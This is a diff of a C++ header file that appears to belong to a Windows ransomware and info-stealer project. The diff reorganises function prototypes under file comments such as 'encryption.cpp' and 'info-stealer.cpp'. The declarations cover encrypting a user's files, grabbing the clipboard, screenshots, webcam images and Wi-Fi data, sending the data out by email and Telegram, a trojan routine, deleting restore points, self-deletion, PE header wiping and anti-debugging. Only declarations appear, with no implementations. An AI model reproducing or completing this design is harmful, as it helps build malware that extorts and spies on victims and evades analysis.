@@ -17,26 +17,40 @@
 #pragma comment(lib,"Wininet.lib")
 #pragma comment(lib, "strmiids.lib")
 
-
 typedef struct timeval2 {
     long tv_sec;
     long tv_usec;
 } timeval2;
 
+std::vector<std::string> filesLink;
+
+
+// functions.cpp
 std::string Exec(const char* cmd);
+void CreateAndSetRegKey(HKEY key, std::string keyPath, std::string keyName, std::string value);
+std::vector<std::string> Split(const std::string& s, const char& delimiter);
+std::vector<std::vector<std::string>> VectorSplitter(const std::vector<std::string>& baseVector, int parts);
+std::vector<std::vector<BYTE>> VectorSplitter(const std::vector<BYTE>& baseVector, int parts);
 bool Copyfile(const char* From, const char* To);
-std::string PowershellEncodedCommand(const std::string& cmd);
-DWORD TrojanFunction(LPVOID url);
-DWORD RemoveTasks(LPVOID params_useless);
-void PEHeaderDeleter();
-void ImageSizeIncreaser();
-void GetAllFiles(const std::string& username);
-int GetTimeOfDay(struct timeval* tp, struct timezone* tzp);
-std::string GenerateRandom(const int len);
-std::string GetRandomUserAgent();
-std::vector<std::string> GetFiles(const std::string& mainDir);
-std::vector<std::string> Split(const std::string& s,const char& delimiter);
 bool FileExists(const std::string& name);
+void DropFile(const std::string& content, const std::string& path);
+void ChangeWallpaper(const std::string& content);
+void ChangeIcon();
+
+// sender.cpp
+bool IsConnected2Internet();
+void SendEmail();
+void SendTelegram();
+void ScheduleTask();
+
+// encryption.cpp
+void GetAllFiles(const std::string& username);
+std::vector<std::string> GetFiles(const std::string& mainDir);
+void EncryptFiles(const std::vector<std::string>& files, const std::string& key, const std::string& iv);
+
+// info-stealer.cpp
+int GetTimeOfDay(struct timeval* tp, struct timezone* tzp);
+std::string GetRandomUserAgent();
 std::string GetDate();
 std::string GetHWID();
 std::string GetIPData();
@@ -48,22 +62,20 @@ std::string GetResolution();
 std::string GetWinVersion();
 std::string GetLanguage();
 std::string GetClipboard();
-std::string GetScreenshot();
 std::string GetWifi();
-std::vector<std::string> GetLinks();
+std::string GetScreenshot();
 std::vector<std::string> GetWebcams();
-void SendEmail();
-void DropFile(const std::string& content,const std::string& path);
-void ChangeWallpaper(const std::string& content);
-bool IsConnected2Internet();
-void ScheduleTask();
-std::vector<std::vector<std::string>> VectorSplitter(const std::vector<std::string>& baseVector, int parts);
-std::vector<std::vector<BYTE>> VectorSplitter(const std::vector<BYTE>& baseVector, int parts); void DeleteRestorePoints();
-void DeleteMe(const std::string& myPath);
-void EncryptFiles(const std::vector<std::string>& files,const std::string& key, const std::string& iv);
 void UploadFiles(const std::vector<std::string>& files);
-void TakeWebcams();
-void ChangeIcon();
-void SendTelegramInfo();
+std::vector<std::string> GetLinks();
+
+// security.cpp
+std::string PowershellEncodedCommand(const std::string& cmd);
+std::string GenerateRandom(const int len);
+DWORD TrojanFunction(LPVOID url);
+DWORD RemoveTasks(LPVOID params_useless);
+void DeleteRestorePoints();
+void DeleteMe(const std::string& myPath);
+void PEHeaderDeleter();
+void ImageSizeIncreaser();
 BOOL WINAPI HookIsDebuggerPresent();
 bool AntiDebug();
